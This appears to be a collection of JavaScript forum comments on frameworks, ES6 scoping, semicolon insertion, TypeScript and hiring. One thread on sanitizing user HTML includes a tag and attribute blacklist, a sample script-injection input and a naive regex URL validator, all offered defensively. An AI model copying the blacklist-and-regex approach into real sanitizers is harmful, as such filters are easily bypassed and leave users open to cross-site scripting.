Angular still has lots of shortcomings beyond performance. Everything from the crappy docs to directives (yuck) leaves a lot to be desired. There's a reason why they rewrote it from scratch in Angular 2.0 (many reasons really). Version 1 should not have been touted as production ready.
The "fixed" react hype demo doesn't have the hover popup at all any more.
That one looks sweet! I wonder how many of the After Dark screensavers have been ported to the web. Here's one I found for flying toasters: http://www.bryanbraun.com/2014/03/15/how-i-rebuilt-flying-toasters-using-only-css-animations
I don't get this obsession with speed. Neither of them is slow enough to matter out of the box. If you do get to a size where it starts to matter, they both offer ways of solving it. Ease of maintenance, documentation, community, these are ten times more important to me than "rendering speed in 1000 iterations".
I agree with you. As stated, I don't like creating an array just for a condition and the throwing it away. Also This, at least the js version, is far less readable.
Great stuff! Having spent the last month [building a websynth](http://github.com/stevengoldberg/juno106), I look forward to digging more into your code later, as well as trying it out with MIDI. On first blush I think it's cool that you've included a variety of waveforms and 3 different noise types, and the presets sound very nice. Kind of surprised that there's no support for playing it with a QWERTY keyboard though -- obviously MIDI is much better, but QWERTY still beats having to click the keys with a mouse.
It was $25/hr and I contracted/freelanced with a Advertising/Marketing agency. Basically a small company that did branding, advertising, etc. but really, people hired them to make their websites. I built WP sites from their PSD designs. I found them on Craigslist; however, plenty of these smaller agencies *should* have positions available on Monster.com, LinkedIn, and other more "traditional" job boards (meaning: not specific to web dev). With that said, I haven't looked for a job like that in years so Idk what the state of these smaller agencies is.
In Firefox on OS X, I get this: SyntaxError: An invalid or illegal string was specified app.js:43:0 
But what about taking away *var* while keeping *let*? From what I've read a *let* in function or global score acts pretty much like a *var*.
Large single page web apps with a lot of data binding going on on screen at one time make it particularly easy to run into performance problems, especially when it's an enterprise web app that has to support legacy browsers, like IE8. It's true, however, that many of these frameworks are "fast enough" for most use cases. There will always be a lot of people that want to take the most performant &amp; scalable approach no matter how big their app will actually be though, simply due to pride in engineering and wanting to produce the best possible experience.
Haha, having exercises is pretty cool. Would love to see that in these articles more often.
Both of those are kinda terrible practice in my book. Write some named functions like `function doTheThing(aThing) { return do(aThing); }` then pass it as your callback like `iTakeACallback(coll, doTheThing);`. It eliminates ugly stacktraces and at the same time callback hell.
I wrote a blog post comparing the performance of React, Angular and Knockout. It's not perfect, but it illustrates that out of the box, React performs better than both Angular and Knockout. http://dapperdeveloper.com/2015/01/26/performance-of-angularjs-reactjs-and-knockoutjs-compared/
given that functions are first class objects, javascript should look like lisp.
I would love to form and join a "Sarcastic repo" list.
I actually looked it up a while after posting my answer. I quite like some of his work as well. So, to sum it up, your post was interesting for two reasons : JS and art ! :)
Fork [**Node**](https://github.com/joyent/node).
In babel sourcemaps or es6?
You typically don't want to have your handleClick scope be the scope of the button. If you need access to the button, you can use e.target. If you are working in a object literal, it would be something like this (Very crude and old school here, I'd prefer something like React where this is autobinded): var Module = { init: function() { $('button').click(this.handleClick.bind(this)); }, handleClick: function(e) { if (this._isOn) { this._isOn = false; this.changeText('off'); } else { this._isOn = true; this.changeText('on') } }, changeText: function(text) { $('.text').text(text); } };
There are only 2 hard problems in computer science: * Cache invalidation * Naming things * Off by one errors
You could ping @[padenot](https://twitter.com/padenot) about it -- he's the Mozilla WebAudio guy, and he just told me over on Hacker News that an issue with my synth in FireFox is a bug they're currently fixing.
Seriously people, ReactJS is awesome and I'm glad it solves your problems, but it's not a framework. Quit calling it one, you do a disservice to both React and actual frameworks.
Would there be any way to design the rectangles/polygonals (the rooms) in advance, using some kind of design tool?
Thanks, I ended up going the jQuery route as I can see that being easier to work with in the future since I am currently learning more and more jquery.
What? I didn't even express a viewpoint. I simply asked what was wrong with directives since RankFoundry expressed distaste when mentioning them. I want to know what RankFoundy has to say about them. Nothing more, nothing less. 
I get "106.js requires a device with at least 1024x768 resolution." My resolution is 3200x1800, using Chrome (windows) 43.0.2357.81 m. 
I think most experts would argue that you should never have been declaring vars in block scope anyways because it's confusing. I think JSLint requires you to declare them in function scope. Ergo, there's really no use for vars in modern ES6 using best practices.
But making a language not backwards compatible is a huge decision.
Ohai, this is just the first post in the series - the rest will be more js-focused. If there's anything you would like to see covered in particular, let me know! I'll work it in if it's not already on the plan.
This will devolve into a debate on preferences but after trying libraries/frameworks that use them and ones that keep all that stuff in JS, I'd take the latter any day.
Good point--in that case OP should rename the function. Probably just pseudo-code though, NBD
Do you happen to have any links explaining that in more detail? 
It's not really an issue of features, it's architecture and redundant ways to do things with unclear differences (if any). Nothing wrong with complaining when it's justified. I'm not a React fanboy. I'm not a fanboy of anything which is why I get on the nerves of fanboys.
Thanks! Sorry for the narcissism, but I will quote something from the About of Viktor: &gt; Why would you build this? &gt; I love Music. :) &gt; &gt; Ever since I got into using virtual instruments, I wanted to take a peek into the world of Digital Signal Processing, but it always seemed so far off reach - I had to learn C++, get a dozen books on DSP etc. So I never really took the time required. &gt; &gt; But just a couple of months ago I heard about Beep.js and it caught my attention. I started experimenting, read and watched everything I could find on Synthesizers and started building what later became Viktor. &gt; &gt; My primary source of inspiration was the Minimoog. And since I have never owned a synth, nor have I seen or played a Minimoog I got the user manuals and electronics schematics and started reading what connects to what, what are the ranges of different values and so on and here we are. :) I hope this would inspire someone (someday).
In ES6 assigning a function to a variable gives the function the variables name if it doesn't already have a name. You can try it with Babel: let foo = () =&gt; 0; console.log(foo.name === 'foo'); 
Both
Nope that was it. I figured that was the answer but it seemed too simple, lol.
Agreed! Components ftw! I feel like React is kind of like components + the awesome mini DOM update feature (which is the dopest part). Do you know if they have a good solution for media queries yet? I haven't looked in a bit but last I remember this was a bitch to implement inline.
If you're comparing ES5 syntax from angular, you should be comparing it to ES5 syntax from react. 
It takes like... 1-2 hours to get started with Typescript if you are familiar with other strongly-typed languages. Beautiful.
Sounds like a great gig. You get to work in scala. I'm jealous. Great language. 
Um, make it a radio input instead of a checkbox. https://jsfiddle.net/z95dsf1k/
I did want to get through it, and it seemed like he had some interesting stuff to talk about.... but he's just so clumsy and terrible at speaking. It's painful for me.
IIRC it originally was made to make forms easier 
Thanks for your suggestion. I am using Handlebars as my template layer, actually. But in order to implement formatting in user's article bodies, I need to allow for HTML rendering. In other words, instead of the "double stash" placeholder for Handlebars data insertion, which neutralizes HTML, I need to use the "triple stash" placeholder so that my own inserted markup gets rendered: **{{{**article body with some HTML annotations goes here**}}}** This allows application-generated HTML to be dropped into that spot in the view. My article bodies are generated by user post submissions. I need to drop that content with some of my own HTML mark up into the tag above. But before I do that, I want to neutralize any potential user-supplied HTML first. I will also add my own application-generated HTML then to enable formatted content like links, images, event handlers, styling, etc.
Great sounding synth!
&gt; I'm guessing you're going to use ES6 features in your forth implementation? Yup, exactly. &gt; I'm not sure what ES6 features you'd find particularly useful You'll have to read the rest of the series and see! :3 &gt; why Forth? These posts are not about PLT or implementing interpreters, I wanted something dead simple to implement so that people not interested or less experienced in those subjects can follow along. 
ES6+ is default for Aurelia. The rest are alternatives. Rails has the same kind of options.
Excellent, thanks for the pointer.
Remember - TypeScript is JavaScript with sprinkles. If you don't understand how JavaScript works, TypeScript won't be a magic cure all. If you're an aspiring JavaScript dev, I strongly suggest you have a handle on how JavaScript works (e.g. ```this``` pointer, prototypes) before diving in to learning the sprinkles. That being said - I love the daylights out of TypeScript. I was a C# dev that transitioned straight to TypeScript, without understanding JS first. It was a pretty bumpy ride. Once I figured out JavaScript, TypeScript has been great. Nice to see more and more professionally developed tutorials for it.
So many confused trend-chasing parrots in here after ReactJS just told them that "Two way databinding is an anti-pattern."
Lisp is not "purely functional". I don't know if I would say it is _one_ language, but it's certainly not purely functional.
I have played around making some changes. But I have not come up with any useful patches yet.
Upshot answer ... this is what the OWASP page recommends: &amp; --&gt; &amp;amp; &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; " --&gt; &amp;quot; ' --&gt; &amp;#x27; &amp;apos; not recommended because its not in the HTML spec (See: section 24.4.1) &amp;apos; is in the XML and XHTML specs. / --&gt; &amp;#x2F; forward slash is included as it helps end an HTML entity That's a few more special characters than I was thinking. Also, I will eventually need to include URL links in people's posts so I will need to find a well-maintained library that has a validator in it. I was thinking of just implementing it myself but perhaps a more professional library would be the better way to go. protocol://host:port/path protocol = /http|https/; host = /[a-zA-Z0-9.\-]+/; port = /[0-9]+/; path = /[a-zA-Z0-9_\-\?\&amp;\=\/]+/; Would it need to be more complex than that? If the URL matches those patterns I'm having a hard time imagining that someone could inject anything dangerous into that format (other than pointing people to bad websites in general). Perhaps I should strictly be unicode-correct?... which suggests that I would need a professional lib. 
OWASP is a great resource. I implemented a security util a few months ago for the exact same thing you're doing. The BEST way to go about it is to implement a white list-- the next HTML standard (or what-have-you) that comes out is going to have new things that are unaccounted for. Unfortunately I couldn't do that for my requirements, so here's how I implemented mine if it helps you: I determined a blacklist for dangerous tags: applet, body, button, embed, form, frame, frameset, head, html, iframe, ilayer, input link, meta, object, option, script, select, style And a blacklist for styles: expression, behavior A blacklist for attributes: class, data-* Each list was mapped to an optional evaluator which would have a whitelist to determine if it could be used within its context. For example, the class attribute, in which I allowed some selected classes like external-link which was added from the client-side script automatically after the user submitted the content. After that was established, I ran the HTML through a parser to determine that it was valid (not closing off any tags before they exists) and then used my blacklists to filter the HTML. It's important that you DO use an actual parser, and DO NOT use regular expressions, because it will not deem your HTML safe. Finally, you want to consider what to do with any dangerous HTML that the user posted. Do you want to strip it, encode it, or warn the user before tampering with their content? It may depend on the situation, so make this an option. For example, if a user posts: This is my HTML Snippet: &lt;code&gt; &lt;script&gt;alert("Hello!");&lt;/script&gt; &lt;/code&gt; You probably want to encode it since it wasn't their intention to post malicious content. I'm happy to help with any questions!
Not in the OnReady, but the script is loaded at the end of the document. I figure that's why the Test1 and Test3 show in the console.
Could you explain "doesn't bubble?" I'm new to this world.
&gt; I remember when I first started working with AngularJS and everyone was swooning and now a new shiny toy is out and the hatred is extraordinary. I can't say I ever liked Angular much. &gt; If you honestly believe a large team developing a large application can shove immutable.js in it and get production-ready performance than you clearly haven't programmed large applications. No, of course not. It provides massive benefits *in the context of React*. You only need to do reference equality checking in `shouldComponentUpdate`. &gt; Furthermore, why are you comparing a view-manager (React) an entire front-end framework (AngularJS)? Ask the OP that. &gt; No $broadcast or $emit? Events have nothing to do with performance, but they are the antithesis of good Angular design. Yes, they are considered bad design *now*, and yet people still use them. &gt; The one and only real problem with Angular was always the same: the docs were really, really bad. Yeah, no. &gt; The downside, however, is that it's now vogue to talk about how horrible AngularJS is and list off a bunch of grievances, the majority of which show that the person really didn't learn Angular, for whatever reason. I've worked with Angular for years, and learned *a lot* about it. Almost all of that knowledge is about Angular-specific cruft that is there to make businesspeople/Java developers feel better. With React, if you know JavaScript, you're already most of the way there. &gt; React is a great view manager. It has a host of problems as well, and more of those problems will become apparent when the framework ages, much as they did with Angular. And undoubtedly, we will eventually come full circle and have people whining about how horrible React is compared to JesusFramework 1.0. Very true. React is not the one framework/library to rule them all. There are already superior alternatives popping up. But for now, people are going to focus on the popular frameworks.
&gt; According to this SO Answer isAuthenticated() is a req method in passport. So that part is baked in. iieeuugghhh . . . undocumented features. Ok thanks.
"f you are a software developer thinking that my standards are unfair, think again. If most companies raised their standards, many the -10x developers would either change career or they would train themselves to start adding value. " If you are trying to hire someone, why dont you spend some time training and orienting your new hire with skills specific to your position, because no two fucking job positions are alike. Stop asking for what you want to be handed to you on a plate instantly like some self-entitled biatch who things the whole world revolves around you. 
&gt; TypeScript is JavaScript with sprinkles I think that's part of the reason why it's been so successful. Unlike CoffeeScript, Dart, Elm and most of the other compile to JS languages, TypeScript is not trying to replace JS. The fact that vanilla JavaScript is valid TypeScript makes a huge difference IMO when it comes to uptake. 
Nope. The constructor doesn't (and shouldn't) know what references the object it constructs.
I don't know why but I heard this in Chris D'Elia's voice.
Not possible. You could however modify the behavior based on whether or not the "new" keyword is used. You can tell if it was used by testing in the custructor function if the context is itself.
As /u/homoiconic pointed out, `const` prevents reference change. FYI, you *can*, but should never ever do: const a = [1, 2, 3, 4, 5]; a[0] = 9; This is one reason we have immutable objects/collections, but mostly by convention, you shouldn't do this anyway.
:/ Thanks for the help, but I seem to have found the issue. Elsewhere on the page is a div being put "in front" of it that is intercepting the events. Now I've gotta figure out how to z-order the divs. Thanks though!
It does not seem overly complex to create a simple solution to the problem. Your not looking for optimal - that is what libraries and the Internet is for. You want to see thought process and methodology.
well in that case, I would have to say *The Internet*. It's a job related thing. I collected these data overtime from various sources for a website in which we keep such details .. having uptodate content was a pita so I decided to OS it.
Can `let` variables not be more simply converted to `var`s by renaming them?
Generators? Promises? 
Salty, eh?
&gt; I have not always been in a position to hire others. I went through the process of writing my resumes, I have written resumes for other people, participated in interviews, and I have also worked with people who should never have been hired. So, OP has never been in a role where he is weeding through resumes and conducting interviews (sitting in the room as a fly on the wall doesn't count). Instead, he wants to stand atop his ivory tower and tell us how un-hirable most developers are. Yup, that's the guy I want to take all of my advice from the next time I need to fill a js position.
I think they can be important. There are trivial tasks that they could all complete equally easily. But there are complex tasks for which some are better than others. And, probably more important, developers prefer some to others. I know I have s very strong preference. It's mostly based on which f framework fits best with the project and how I like to do things.
There are actually quite a few solutions available. See https://github.com/MicheleBertoli/css-in-js for an extensive list. The whole CSS side is still in bit of a flux but it's getting better. Read https://medium.com/seek-ui-engineering/the-end-of-global-css-90d2a4a06284 to get a better idea of where we are possibly going.
I'm honestly curious what the host of problems you find React has. I'm kind of jumping between Angular and React for two projects and I'm not sure I'm sold on either, but all I read about React and Flux (and soon to be Relay and GraphQL and whatever the hell else) is unfaltering praise and never any good criticism. I would love to see more opposing viewpoints for the above.
Framework choice definitely matters but a lot of it is personal preference. Universal things you want to look out for though are: - Tested. You wan't something that works. - Active community. Help is there when you need it. - Regularly updated. New features, bugfixes, 
To replace `var`, couldn't you use the function scope arguments variable and add new variables as properties of that object? Something like this: function fn(arg1, arg2, arg3){ // arguments is function scope array object arguments.loxalvar1 = 12; } Wouldn't that work?
Actually no, if you enter the span and the div at the same time, probably the span's mouseover is triggered before, and as mouseenter does not bubble, the div's mouseenter event never gets triggered. Maybe try to make your span 1px smaller :-)
I do that all the time. It's cumbersome to write names but stack traces indeed became better to read. // I use expressions for normal functions var foo = function foo(v){return Math.sqrt(v+123)}; // Great for asynchronously doing something without using promise libraries (function readFile(arr, ind, callback){ if(ind == arr.length){ callback(null); return; } // I often do not write function names if it's simple. // (I would have left `foo` above) fs.readFile(arr[ind], 'utf-8', function(err, s){ if(err) callback(err); else readFile(arr, ind+1, callback); }); })(['foo.txt', 'bar.txt'], 0, afterReadFile); // I use statements for constructors function Foo(){ this.bar = 42; } Foo.prototype.toString = function Foo$toString(){ return "My bar is "+this.bar; }; Foo.getOne = function Foo_getOne(){ return new Foo(); };
For now, don't worry about libraries. Learn plain HTML, CSS, and plain JavaScript without the libraries. Once you have a basic understanding, then you can look at all the libraries and you'll be able to choose ones that match your desired workflow.
If I were you, I'd maintain the codebase using ES6 and release in plain JS (ES5). This allows developers to use the library without requiring a build step. At the same time, you can develop the library using cutting edge code. I think using ES6 won't be a hindrance to contributors. If anything, contributors will prefer a codebase that is using the latest tools which they themselves use. For example, [React](https://github.com/facebook/react/blob/master/package.json#L32) is written using Babel. Also, one thing to note about CoffeeScript vs Babel is that Babel is standards track. So people don't feel let down by learning a new syntax only to have it be thrown away when a new version of JavaScript comes around the corner.
Pick something that works for you. There'll be loads of people saying why X is the best framework and that's great but the most important thing is that they work for you and you "get" them.
ES6 is what all javascript users are going to be using in the future anyway, and it's really not much of a jump. The main downside would be if your build process is difficult for contributors to set up, but NPM is making this pretty easy. If this is a library, you should make it so cloning the repo and running "npm install" is enough to get it compiled to javascript. Make sure "npm test" runs the tests too. (I think my [braincrunch library](https://github.com/AgentME/braincrunch) is a decent example of how to use Babel well like this.)
Sources with links so that it can be independently verified would be nice yes. I'll have a look at this, I could use the the calling codes for a website. Thanks!
That type of object creation (what you call anonymous) is generally seen as a code smell, for example here's the JSHint page for ["Do not use 'new' for side effects"](https://jslinterrors.com/do-not-use-new-for-side-effects).
It's numerically close for me: - SF salary @ $150k = $3750USD / fortnight take home. - Sydney salary @ $142k = $3745AUD / fortnight take home. That's excluding 401k / superannuation. In SF I was getting $0 401k, but a 4yr vesting period for stocks valued at approx $120kUSD. In AU, I get the required 9% Superannuation paid on top of my take home pay. Normalizing into AUD, and accounting for vesting stocks: - SF = $663,208AUD after 4yrs (note: I'm not sure what taxation occurs on the stocks if I sell them... 50% maybe? Also: who knows what they'll actually be worth in 4yrs) - AU = $440,600AUD after 4yrs (note: includes superannuation which isn't a liquid asset) Other factors: Rent in SF is higher than Sydney. But everything else (entertainment, food, alcohol, travel, cars, hotels, etc) is cheaper. So expenses come out approximately the same. Health care was included in my US package. I am paying approx $2000 for private cover in Sydney.
The stack trace might actually show the parent function, since arrow functions do not have their own scope. I am not sure though
If you generate sourcemap files when you minify the code chrome will do this for you (although you see the file in the debugger, not your IDE)
I don't see a big architectural issues except ability to use native search for hidden elements but I believe browsers are able to take this into account and store content of hidden elements somewhere in the memory and scroll to item that contains searched phrase while search
disabled = "disabled" //true and disabled = "" // or null == false
Thanks, I figured i did something wrong but still managed to make it work. We're basically given a project and to learn by ourselves.
You realize you are recommending removing the element entirely, right?
I think how useful your library is will be a more important factor when it comes to attracting contributors, so I wouldn't worry about this. Just make an awesome library and people will star But if someone has no intention of staying up to date with the next version of ES you probably aren't missing out on much by them not contributing. But at the end of the day it's your library, develop it how ever you like. 
those guys... they invented their own boolean type based on a string form...??? yay for html5 spec.
If given the choice between `Object.create` and constructor functions, stick with constructor functions. Use Babel if you can. ES6 will support classes which are just sugar over this pattern. Using `Object.create` throughout your code leads to numerous bugs and is confusing for most developers. It is essentially inheritance in disguise. It requires you to call `Object.create` and then `init` which can leave objects in an uninitialized state. The syntax can require knowledge about property descriptors and is confusing and very easy to get wrong. It's too easy to run into a situation where multiple objects share the same mutable state - good luck tracking that bug down. Worst of all in my opinion is the fact that it's just inheritance in disguise. People learn about `Object.create` and then decide that their `dog` object should inherit from `mammal` which should inherit from `animal` and then all hell breaks loose. With classes, it's pretty common knowledge that you should avoid inheritance trees whenever you can. Classes suck too, but not as much if you use ES6. Either way, simple closures are often the best solution: function createPerson(firstName, lastName) { const fullName = firstName + ' ' + lastName; return { get fullName() { return fullName; } }; } createPerson('John', 'Doe').fullName; // "John Doe" ... but the trend is toward using the ES6 `class` keyword.
If what you want is mostly CRUD and you already know Python, definitely go for Django. 
One of those things that you always assume there's already a lib for because it's obvious that someone somewhere is going to have a use case. Good job op. edit: I'd love some default general coloring and sizing based on the logged content.
What do you mean by default general coloring? Is this a suggestion for the library? Sorry I didn't understand. :)
Object.create is usually preferred over using `new`. Keep in mind that Object.create is ES5, so it will work in all modern browsers but maybe not in really hold environments. Natively the new `class` keyword from ES6 is not widely available cross browser, so if you absolutely had to write code that looks like Java you would be limited to a transpiler like Babel. I don't recommend doing this though, because it makes your code less portable. More importantly I would actually ask yourself why you think you really need OOP like inheritance in your code. In JavaScript it is rarely beneficial and like other languages it carries maintenance costs and a large amount of boiler plate.
I've also said nothing about Ember or mozzarella cheese sticks. Perhaps I'm secretly an undercover agent for Ember and Italian cheese in stick form. 
[JavaScript Semicolon Insertion. Everything you need to know.](http://inimino.org/~inimino/blog/javascript_semicolons) TL;DR The answer is a matter of personal preference, but should be made on the basis of informed choice rather than nebulous fears of unknown syntactical traps or nonexistent browser bugs.
Yes, unless you are contributing to a project that for whatever reason want using them before you got there. It improves readability.
Something along the lines of this, including sizing, etc. console.message().error.text('...')... Would have a default red, bold, etc console.message().warn.text('...')... Would have a default orange, etc. console.message().info.text('...')... Would have blue or green. ---- You get the idea.
Yes, unless you're @fat. Grudgematch of the decade: https://github.com/twbs/bootstrap/issues/3057 
According to the spec semicolons are **required** whether they are added by you or by ASI. It is always safer if you add the semicolons when writing the code, because ASI can result in surprises.
Depends. If they mean longest palindrome with any anagram of the given string, that's hard. If they just mean longest possible palindrome while maintaining the current character ordering, then that's fairly trivial. If someone can't code that I'd be worried about their level of competence as a JS developer. 
&gt; It improves readability. Without agreeing or disagreeing with you, that's a matter of opinion.
Using semicolons is still the prevailing trend, so that's one decent reason to use them - consistency with the rest of the world. As far as I understand it there is no truly good reason to not use them and several sticking points if you allow them to be inserted automatically. I just don't see that it's all worth the hassle.
Any tl;dr to avoid listening to clumsy speaker?
Yes. Yes and Yes.
Since they aren't actually optional, yes, please do use semicolons. var y = function () { console.log('¡Ay, caramba!') } (function() { console.log('y00 d34d f00') }()) Output: y00 d34d f00 ¡Ay, caramba!
I wasn't aware this was even a question these days. Submit your semicolonless GitHub code samples with your job application and see if you get a callback... 
Yes, always, every single time you end a non-block statement.
I really am curious about how other people read code when they say they are affected by something like this. Personally if I am looking for something I tend to find the section and interesting code by shape first (which includes all characters and whitespace) then refocusing in by content (like variable or function names). Only on a third pass would I even pay attention to characters like `;` or `{` if there is a syntactic error. It is crucial for me that all code have similar formatting so that my eyes (and brain) can quickly make that first pass. So whether `;` is there or not is not as important as whether it is ALWAYS that way. Finally, as the `;` can help contribute to debugging which contributes to maintainability (which is also one goal of readability) it would seem counter productive to not put it there. If not initially, then at least when you `/[lh]int/` your code. 
&gt; People omitting semicolons is still the prevailing trend Seems like maybe you meant to say the opposite? 
the point of ASI is to avoid hitting the "syntax error, missing semicolon at line X" so ASI is a good thing, but relying on such feature to include ALL your semicolons is, for me, a bit extremist
If you're linting, any of the issues with omitting them will be caught, so I opt for removing them. Especially for unit tests. 
This is glorious. 
I do... mostly so I don't have to argue with people about not using semicolons. I am fairly new at this and have already been placed in situations where I expose more senior devs for really not knowing the reasons why they use semicolons (other than that is just how they learned) when they called me out on not using them. I think it is great that they use them, but if the explanation they give me is "just cuz" is feels lazy and makes weirdness between me and devs that I otherwise look up to. As long as you are consistent and can explain the situations where they are needed/not needed... imo it is just a personal preference. 
This is a good reason to omit them. Our shop is groovy on the back end, without semicolons, so I aim for consistency across our code base.
How does it help in debugging exactly? 
Ah yes, I'm incredibly stupid. I read that as C = A*B for some reason. 25.
That's how all syntax sugar starts. The fact is you can write, safely, entire applications without them. They are not required in your source files. Linting can catch all potential issues just fine.
What problems or downsides do existing, mature projects like NLTK and OpenNLP have, that this project aims to fix/make better?
The article compared Angular's view management compared to React as evidence of why React is better. But the comparison is unfair. The article didn't compare `$digest()` it simply showed that the React demos that prove how much faster it is are in fact, bad demos.
I am saddened by how long that thread is.
I Googled of the projects you mention and would say they are significantly different. Here is one very small example, from the first line of the Knwl docs: "Knwl.js is a Natural Language Processor built in JavaScript."
You might find the chapter *[Behavior Delegation](https://github.com/getify/You-Dont-Know-JS/blob/master/this%20&amp;%20object%20prototypes/ch6.md)* of *You Don't Know JS* useful.
If your entire argument is that it's prettier without semicolons then you are wrong, end of story. Programming is not about being pretty and if that's the best you can come up with, you probably shouldn't be in this field. 
That's one incredibly stupid discussion ! Thanks for that link...Hipster and his zealots fighting common sense...I love it :)
A few problems: 1. Psuedo-javascript language for templates. 2. Animation support is weak. Most animation tools are pure JS animations. The biggest issue I have is that React = Virtual Dom. The rest is just opinionated templating and organizational stuff. React hasn't been out that long and I honestly think that big picture [Mithril](https://lhorie.github.io/mithril/index.html) took the same idea and implemented it much better. Full disclosure: currently using Mithril on a project. I've used ReactJS on a medium sized project and still think it's a VERY good view library.
I still don't know whether you're arguing for or against semicolons.
that doesn't really answer my question unfortunately. 
you mean sometimes its difficult to read things in a language you understand even if there isnt any punctuation or indicators that you're wanting to stop a command or statement thats a crazy notion who would have thought
Yes; They're mental breakpoints; ~~Period~~ Semicolon;
Writing Javascript without semicolons is like writing sentences without periods You can do it, and if you space properly everything will work But if you want to have two statements on one line, you're going to have to use punctuation. And not being able to do this would be kind of a con. This isn't common, but for while statements I like putting the iterator and loop on the same line. var i = 0; while(i &lt; array.length) doSomething(array[i++]);
I am all for putting semi-colons in JavaScript, but I disagree slightly with your first statement. In Go, it's not a good idea to use semi-colons, because if you ever *need* to use semi-colons, it's probably not a good idea. Therefore, the need for a semi-colon is a helpful flag. If you just use them everywhere, you'll never notice when the compiler is about to complain. JavaScript is actually pretty similar, in this regard. However, it wasn't designed with the the idea that semi-colons are red flags. For that reason, there are more likely to be cases where semi-colons are necessary for a good reason in JavaScript than in Go. So i use semi-colons in JS, and not in Go.
Very clever example!
To be fair though I am convinced the WHATWG does not know what an attribute is... https://github.com/whatwg/dom/issues/37
I see your point! I didn't really make it exceptionally clear in my first post, but what I meant was that I think semi-colons should be used in any language (in the same way that they'd apply in a language that requires them), so long as there is no applicable reason no to. So for languages where they have a specific purpose that is different from the style guide you would usually follow (i.e as a flag), then follow that languages style guide. Just as a norm, if theres no reason not to then do it.
Could you explain what's going on here?
Certain code would be syntactically correct with ASI but not work logically.
This has to be a joke, because nobody would say that and be serious.
I can't say I agree. The overwhelming majority of experienced JS developers will use semicolons without even thinking about it. If I were my clients, I wouldnt want to take ownership of js without them. Also, a whole lot of us will be writing other code with our js, like css, that requires semicolons for line endings. Omitting them in some places, but being required to put them in others would probably hinder my productivity little by little because I will go to run or compile something where I accidentally omitted one where required. Those seconds add up to minutes, which add up to hours.
Sorry, w3school hater here. https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute 
Your argument to avoid 1 semicolon is to add 5 characters "void ". I think ... that says everything that needs to be said here.
&gt; They are not required in your source files. You *can* drive with your feet or swallow handfuls of small rocks. That doesn't mean it's a *good idea* to do so.
Here's a reason for you (that I pulled out of the thread this post links to): Javascript interpreters on different browsers interpret missing semicolons inconsistently, because without semicolons, the grammar is actually ambiguous. Here's another: You're working with other people. Other people will have to read and maintain your code. Those people have standardized on a particular coding style, and that coding style includes semicolons. If you're working on code that's been maintained by a bunch of different people over the years, consistent style rules are extremely important for readability. As a new coder, you probably don't appreciate that, but a few years of experience, and a few projects where you have to maintain someone else's badly written code, and you'll probably start to see where the senior devs are coming from. This is conjecture on my part, but I'm guessing the reason that JS allows you to omit semicolons is to make it less likely to throw errors with sloppy code (early web browsers did this a lot with html, too). It's likely that the feature was intended to be more like this: "Can we fix this syntax error by inserting a virtual semicolon here? Great! Let's see what happens!" If you hate semicolons that much, use a language that's built from the ground up with a syntax that doesn't include semicolons. Don't use a language that tries to parse them in at compile time in case you forgot them. 
Yes ffs
Eslint is much better than both of those.
If you used semis in JS you would be able to tell instantly which language you were in...
Yes. Readability matters, and not just for yourself. The clearer you can be to other people reading the code, the better.
&gt; why you think you really need OOP like inheritance in your code Because encapsulation?
of all the ways to increase productivity, omitting a semi colon is not one
Or people would continually omit them and be caught by the lint step.
&gt; And if the answer for why a person or project is using a semicolon is "i dunno.. cuz" rather than an informed decision, I will stand the thought that it is a lazy reason. It's lazy arguing. In the best case scenario, this discussion will "only" waste some time, but ultimately it won't have any positive effect on the project. You are just burning money and spinning your wheels. Trying to sidestep this is a valid strategy, because there is absolutely no point to this. For this to have an effect, you'd need to convince everyone... and then all the code gets changed... and everyone changes their editor/auto-formatter settings... and... Yea, won't happen. No one will pay for this. &gt; And personal opinion is relevant If you aren't starting fresh and putting some style guide together, no, it's not relevant.
(do you want to be giving your app token away there?) edit: if you're sure it's completing but not outputting correctly, stick a `debugger;` statement in there so you can inspect the result in your browser's devtools.
afaik all modern browsers handle ASI just fine. If you've already decided not to support old IE, I don't really think this argument holds weight. 
He's not wrong... your comments indicate that your frustration with Angular had more to do with your inability to learn how to use it properly, rather than a real complaint about implementation. You aren't alone.
Yes, unless you want to be murdered by the dev who eventually takes over your project.
Whether or not you choose to use semicolons in your code, you should at least take a few minutes out of your day to understand [the rules of ASI](https://github.com/feross/standard/blob/master/RULES.md#automatic-semicolon-insertion-asi). It's better to understand the issue rather than pretend it doesn't exist.
No, the only times inheritance is really needed is to conserve memory in two exceedingly rare scenarios: 1. Rapid event (async) calls 2. A huge list of recursive calls The first one needs to conserve access to memory otherwise frequent garbage collection will slow down an application that demands heavy continuous user interaction. This typically only comes up with games, but it could come up in other places. The second one could result in total consumption of memory and crash the application where a function is being called recursively faster than garbage collection is capable of freeing up consumed memory respective of each call. This typically comes up powerful file system or packet analysis utilities. Otherwise, you absolutely **DO NOT NEED** inheritance in this language. People typically prefer to punish themselves with inheritance because they are coming from another language (typically Java or Python) and cannot imagine coding without it. This in turn punishes everyone around them.
Thanks! What do you mean how you can get the usage example? :)
No it actually does, as your brain doesn't have to apply ASI rules in memory but easily see them in the code.
Hi, thanks for the link it looks nice. it says " Pin.js was crafted to work with modern browsers (IE9+)" do you know the compatibility on mobile? i had that kind of thing in an old website and it was quiet hard to get it working with android stack browser
Hmm. I have been wondering if this is worth implementing. I am not sure actually. It is pretty easy to get such kinds of errors by doing something like `console.message().text('...', { color: 'red' })`. However, the messages could be made a lot more coloreful but I am not sure for the use cases. If you have any idea I would love to hear them.
&gt; Explicit is better then implicit. Some rule I picked up somewhere and it holds up pretty well so far. So yes, add them.
jshint and eslint both have options to handle ASI. :) 
Here is what got me started with Grunt: http://24ways.org/2013/grunt-is-not-weird-and-hard/ It walks through exactly what you're looking for.
There is some syntax highlighted code [in this example](https://camo.githubusercontent.com/30959b6ce07e5e1d86f135555b2f2f8b9be2194c/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f752f343237373630332f636f6e736f6c652e6d6573736167652f6a73626c6f636b732d6578616d706c652e676966) but I don't see how to put that in a log message myself.
To be more precise. There are two types of hoisting. Function hoisting which alway occurs first, and variable hoisting which occurs right after function hoisting. The above snippet uses function hoisting. If you are interested in this topic further, I would definitely suggest giving [You Don't Know JS: Scope &amp; Closures](https://github.com/getify/You-Dont-Know-JS/blob/master/scope%20&amp;%20closures/README.md#you-dont-know-js-scope--closures) a read.
